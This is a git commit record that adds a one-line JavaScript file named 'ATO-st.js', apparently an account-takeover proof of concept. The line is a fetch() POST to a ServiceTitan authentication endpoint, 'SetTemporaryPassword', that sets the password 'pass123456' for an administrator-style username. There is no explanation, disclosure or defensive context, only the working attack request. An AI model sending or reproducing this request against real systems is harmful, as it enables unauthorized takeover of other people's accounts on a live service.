aec01a38f44703e2cea874921cdf8317482eaf86
tomoncrss <tonymyson89823@gmail.com>
2025-02-27 11:25:47 +0330

    Add files via upload

---
+++ ATO-st.js
@@ -0,0 +1,1 @@
+fetch('https://integration.servicetitan.com/app/api/auth/SetTemporaryPassword',{headers:{'Content-Type': 'application/json'},method: "POST",body: JSON.stringify({"Username":"servicetitan_a_admin10","Password":"pass123456"})})
